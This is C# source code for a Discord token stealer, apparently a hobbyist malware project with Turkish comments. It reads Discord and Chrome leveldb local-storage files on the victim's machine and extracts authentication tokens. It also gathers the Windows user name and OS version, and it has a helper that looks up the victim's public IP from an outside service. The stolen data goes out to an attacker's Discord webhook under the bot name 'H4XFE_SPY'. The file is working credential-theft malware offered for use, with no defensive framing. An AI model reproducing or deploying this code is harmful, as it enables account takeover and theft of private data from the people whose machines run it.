using System.Management;
using System.Net;
using System.Text;

namespace Discord_Token_Stealer
{
    static class Program
    {
        static void Main()
        {
            #region grabbing token
            string h4xfeFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\"; //Discord db Dosya konumunu çeker ve h4xfeFolder stringine yazdırır.
            if (!dotldb(ref h4xfeFolder) && !dotldb(ref h4xfeFolder)) // üstteki stringe karşılık gelmiyorsa hiçbir şey yapma anlamına gelir.
            {
            }
            System.Threading.Thread.Sleep(100);// 100ms sisteme gecikme eklendiği kısım
            string h4xfelog = tokenx(h4xfeFolder, h4xfeFolder.EndsWith(".log")); //.log ile biten verileri h4xfelog stringine yaz anlamına gelir.
            if (h4xfelog == "") // log boşsa h4xfelog değerini N/A gönder anlamına gelir.
            {
                h4xfelog = "N/A"; 
            }

            string h4xfeFolder2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"; //Chrome db konumunu çeker ve string h4xfeFolder2 içerisine atar.
            if (!dotldb(ref h4xfeFolder2) && !dotlog(ref h4xfeFolder2))//atanan 
            {
            }
            System.Threading.Thread.Sleep(100);
            string h4xfelog2 = tokenx(h4xfeFolder2, h4xfeFolder2.EndsWith(".log"));
            if (h4xfelog2 == "")
            {
                h4xfelog2 = "N/A";
            }
            #endregion
            using (DcWebHook h4xfeweb = new DcWebHook())
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");// Windows sisteminin sürüm bilgisini databaseden çekmek için kullanılır.
                foreach (ManagementObject managementObject in mos.Get())
                {
                    h4xfeweb.ProfilePicture = "https://i.hizliresim.com/ATJe68.jpg";//botun fotoğrafı buraya.
                    h4xfeweb.UserName = "H4XFE_SPY";//Bot ismi
                    h4xfeweb.WebHook = "WebHook_Token Link";//Discord Webhook token linki buraya
                    String OSName = managementObject["Caption"].ToString();//İşletim sistemi ismini çeker.
                    h4xfeweb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: "  + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + h4xfelog + Environment.NewLine + "Token Chrome: " + h4xfelog2 + "```"); //Çekilen verileri yazdırır.
                }
            }
        }

        private static bool dotlog(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string h4xfeFolder = "";
            string h4xfelog = @string;
            while (h4xfelog.Contains("oken"))
            {
                string[] array = IndexOf(h4xfelog).Split(new char[]
                {
                    '"'
                });
                h4xfeFolder = array[0];
                h4xfelog = string.Join("\"", array);
                if (boolx && h4xfeFolder.Length == 59)
                {
                    break;
                }
            }
            return h4xfeFolder;
        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        public static string GetIPAddress()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }

        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
 
    }
}